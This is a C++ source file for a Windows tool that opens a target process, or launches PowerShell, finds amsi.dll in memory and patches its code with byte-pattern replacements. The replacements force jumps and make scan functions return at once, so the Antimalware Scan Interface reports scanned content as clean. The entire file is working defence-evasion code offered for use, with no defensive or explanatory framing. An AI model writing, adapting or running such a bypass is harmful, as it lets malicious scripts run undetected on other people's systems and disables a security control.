#pragma once
#pragma warning(disable: 4996)

#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <psapi.h>
#include <vector>
#include <iomanip>

#pragma pack(push, 1)

struct PatchLocation {
    DWORD offset;
    DWORD_PTR address;
    BYTE originalBytes[16];
    int size;
};

struct PatternInfo {
    const char* name;
    BYTE pattern[16];
    BYTE replacement[16];
    int size;
};

const PatternInfo AMSI_PATTERNS[] = {
    // result checking patterns
    // fce : function
    { "AMSI_RESULT_CLEAN", { 0x83, 0xF8, 0x00 }, { 0x83, 0xF8, 0xFF }, 3 },                    // cmp eax, 0 -> cmp eax, -1
    { "AMSI_RESULT_DETECTED", { 0x83, 0xF8, 0x01 }, { 0x83, 0xF8, 0xFF }, 3 },                 // cmp eax, 1 -> cmp eax, -1
    { "AMSI_RESULT_CMP1", { 0x3D, 0x01, 0x00, 0x00, 0x00 }, { 0x3D, 0xFF, 0xFF, 0xFF, 0xFF }, 5 }, // cmp eax, 1 -> cmp eax, -1 (alternate enc)

    // common conditional jumps in amsi eval
    { "AMSI_JZ_TO_JMP", { 0x74, 0x0A }, { 0xEB, 0x0A }, 2 },                                   // jz -> jmp
    { "AMSI_JNZ_TO_JMP", { 0x75, 0x0A }, { 0xEB, 0x0A }, 2 },                                  // jnz -> jmp

    // test result patterns
    { "AMSI_TEST_JNZ", { 0x85, 0xC0, 0x75 }, { 0x85, 0xC0, 0xEB }, 3 },                        // test eax, eax; jnz -> jmp
    { "AMSI_TEST_JZ", { 0x85, 0xC0, 0x74 }, { 0x85, 0xC0, 0xEB }, 3 },                         // test eax, eax; jz -> jmp

    // API fce starts - replace with xor eax,eax; ret
    { "AMSI_SCAN_FUNC_START", { 0x48, 0x89, 0x5C, 0x24, 0x08 }, { 0x31, 0xC0, 0xC3, 0x90, 0x90 }, 5 }, // common function prolog -> xor eax,eax; ret; nop; nop
    { "AMSI_SCAN_FUNC_START2", { 0x40, 0x53, 0x48, 0x83, 0xEC }, { 0x31, 0xC0, 0xC3, 0x90, 0x90 }, 5 }, // another common prolog -> xor eax,eax; ret; nop; nop

    // scan buffer function patterns
    { "AMSI_BUFFER_CHECK", { 0x48, 0x8B, 0xCF, 0xFF, 0x15 }, { 0x48, 0x31, 0xC0, 0x90, 0x90 }, 5 }, // mov rcx, rdi; call [rip+x] -> xor rax, rax; nop; nop

    // err handling
    { "AMSI_SUCCESS_CHECK", { 0x85, 0xC0, 0x79 }, { 0x85, 0xC0, 0xEB }, 3 },                   // test eax, eax; jns -> test eax, eax; jmp

    // special patterns to force clean results 
    { "AMSI_CMP_PATCH", { 0x0F, 0x84, 0x00, 0x00 }, { 0x90, 0xE9, 0x00, 0x00 }, 4 }           // je -> nop; jmp
};

const BYTE SPECIAL_PATTERN[] = { 0x74, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x30 };
const BYTE SPECIAL_REPLACE[] = { 0x90, 0x90, 0x48, 0x8b, 0x5c, 0x24, 0x30 };

#pragma pack(pop)

class AmsiPatcher {
private:
    DWORD pid;
    HANDLE hProcess;
    std::vector<PatchLocation> patchedLocations;

    HMODULE findAmsiModule() {
        HMODULE hMods[1024];
        DWORD cbNeeded;
        if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) return NULL;

        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            wchar_t szModName[MAX_PATH];
            if (GetModuleFileNameExW(hProcess, hMods[i], szModName, MAX_PATH) && wcsstr(szModName, L"amsi.dll"))
                return hMods[i];
        }
        return NULL;
    }

    void applyPatch(LPVOID targetAddr, const BYTE* patch, int patchSize, DWORD rva) {
        BYTE origBytes[16] = { 0 };
        SIZE_T bytesRead = 0;

        if (!ReadProcessMemory(hProcess, targetAddr, origBytes, patchSize, &bytesRead) || bytesRead != patchSize) return;

        bool alreadyPatched = true;
        for (int i = 0; i < patchSize; i++)
            if (origBytes[i] != patch[i]) { alreadyPatched = false; break; }
        if (alreadyPatched) return;

        PatchLocation patchLoc = { rva, (DWORD_PTR)targetAddr, {0}, patchSize };
        memcpy(patchLoc.originalBytes, origBytes, patchSize);

        DWORD oldProtect;
        if (!VirtualProtectEx(hProcess, targetAddr, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) return;

        SIZE_T bytesWritten = 0;
        if (!WriteProcessMemory(hProcess, targetAddr, patch, patchSize, &bytesWritten) || bytesWritten != patchSize) {
            VirtualProtectEx(hProcess, targetAddr, patchSize, oldProtect, &oldProtect);
            return;
        }

        VirtualProtectEx(hProcess, targetAddr, patchSize, oldProtect, &oldProtect);
        patchedLocations.push_back(patchLoc);
    }

    bool patchAmsiWithPatterns(HMODULE amsiModule) {
        IMAGE_DOS_HEADER dosHeader;
        IMAGE_NT_HEADERS ntHeaders;
        ReadProcessMemory(hProcess, amsiModule, &dosHeader, sizeof(dosHeader), NULL);
        ReadProcessMemory(hProcess, (BYTE*)amsiModule + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders), NULL);

        IMAGE_SECTION_HEADER sections[16];
        ReadProcessMemory(hProcess, (BYTE*)amsiModule + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS),
            sections, sizeof(sections), NULL);

        printf("AMSI.dll at: 0x%p\n", amsiModule);

        for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
            if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

            LPVOID sectionBase = (BYTE*)amsiModule + sections[i].VirtualAddress;
            DWORD sectionSize = sections[i].Misc.VirtualSize;
            DWORD sectionRVA = sections[i].VirtualAddress;

            char sectionName[9] = { 0 };
            memcpy(sectionName, sections[i].Name, 8);
            printf("Scanning section %s (size: 0x%x)\n", sectionName, sectionSize);

            BYTE* sectionBuffer = new BYTE[sectionSize];
            SIZE_T bytesRead = 0;

            if (!ReadProcessMemory(hProcess, sectionBase, sectionBuffer, sectionSize, &bytesRead) || bytesRead != sectionSize) {
                delete[] sectionBuffer;
                continue;
            }

            for (const auto& pattern : AMSI_PATTERNS) {
                int patternCount = 0;

                for (DWORD j = 0; j < sectionSize - pattern.size; j++) {
                    if (memcmp(&sectionBuffer[j], pattern.pattern, pattern.size) != 0) continue;

                    bool skipPattern = false;
                    for (const auto& loc : patchedLocations)
                        if (sectionRVA + j >= loc.offset && sectionRVA + j < loc.offset + 20) {
                            skipPattern = true;
                            break;
                        }

                    if (skipPattern) continue;

                    LPVOID patchAddr = (BYTE*)sectionBase + j;
                    applyPatch(patchAddr, pattern.replacement, pattern.size, sectionRVA + j);
                    patternCount++;
                }

                if (patternCount > 0)
                    printf("Patched %d %s instances\n", patternCount, pattern.name);
            }

            int specialCount = 0;
            for (DWORD j = 0; j < sectionSize - sizeof(SPECIAL_PATTERN); j++) {
                if (memcmp(&sectionBuffer[j], SPECIAL_PATTERN, sizeof(SPECIAL_PATTERN)) == 0) {
                    LPVOID patchAddr = (BYTE*)sectionBase + j;
                    applyPatch(patchAddr, SPECIAL_REPLACE, sizeof(SPECIAL_PATTERN), sectionRVA + j);
                    specialCount++;
                }
            }

            if (specialCount > 0)
                printf("Patched %d special patterns\n", specialCount);

            delete[] sectionBuffer;
        }

        return !patchedLocations.empty();
    }

public:
    AmsiPatcher(DWORD targetPid) : pid(targetPid), hProcess(NULL) {}

    bool patch() {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            printf("Failed to open process %d\n", pid);
            return false;
        }

        HMODULE amsiModule = findAmsiModule();
        if (!amsiModule) {
            printf("AMSI.dll not found in process %d\n", pid);
            CloseHandle(hProcess);
            return false;
        }

        bool success = patchAmsiWithPatterns(amsiModule);

        if (success)
            printf("\nSummary: patched %zu locations in AMSI.dll\n", patchedLocations.size());

        CloseHandle(hProcess);
        return success;
    }
};

#pragma optimize("gt", on)
int main(int argc, char* argv[]) {
    DWORD targetPid;

    if (argc < 2) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        wchar_t cmdLine[] = L"powershell.exe -NoExit";

        if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("Failed to create PowerShell process\n");
            return 1;
        }

        printf("Created PowerShell with PID: %d\n", pi.dwProcessId);
        Sleep(1000);

        targetPid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        targetPid = atoi(argv[1]);
        printf("Targeting process: %d\n", targetPid);
    }

    AmsiPatcher patcher(targetPid);
    patcher.patch();

    printf("Press Enter to exit...\n");
    std::cin.get();
    return 0;
}